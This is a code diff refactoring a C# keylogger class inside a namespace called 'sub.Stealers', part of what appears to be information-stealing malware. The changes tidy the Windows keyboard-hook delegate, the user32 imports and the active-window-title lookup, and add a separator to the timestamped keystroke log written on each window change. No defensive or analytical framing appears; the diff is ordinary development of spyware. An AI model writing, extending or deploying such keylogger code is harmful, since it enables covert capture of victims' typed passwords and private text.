@@ -65,37 +65,32 @@ namespace sub.Stealers
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
-        private delegate IntPtr LowLevelKeyboardProc(
-            int nCode, IntPtr wParam, IntPtr lParam);
-
         //Window title
         [DllImport("user32.dll")]
-        static extern IntPtr GetForegroundWindow();
+        private static extern IntPtr GetForegroundWindow();
 
         [DllImport("user32.dll")]
-        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
         private static string GetActiveWindowTitle()
         {
             const int nChars = 256;
-            IntPtr handle = IntPtr.Zero;
-            StringBuilder Buff = new StringBuilder(nChars);
-            handle = GetForegroundWindow();
+            StringBuilder buff = new StringBuilder(nChars);
+            IntPtr handle = GetForegroundWindow();
 
-            if (GetWindowText(handle, Buff, nChars) > 0)
-            {
-                return Buff.ToString();
-            }
-            return null;
+            return GetWindowText(handle, buff, nChars) > 0 ? buff.ToString() : null;
         }
+
+        private delegate IntPtr LowLevelKeyboardProc(
+            int nCode, IntPtr wParam, IntPtr lParam);
 
         #endregion
 
         private bool _capslock;
         private string _name = "Keylogger";
-        private string _windowTitle = "";
 
         private bool _shift;
+        private string _windowTitle = "";
 
         public Keylogger()
         {
@@ -131,6 +126,7 @@ namespace sub.Stealers
             //Note: due to the lack of a desire to waste CPU cycles to check for it every time, the log will always start with \r\n which isn't a huge deal
             if (_windowTitle != GetActiveWindowTitle())
             {
+                Data += "------------";
                 _windowTitle = GetActiveWindowTitle();
                 Data += string.Format("\r\n[{0}][{1}]\r\n", DateTime.Now, _windowTitle);
             }
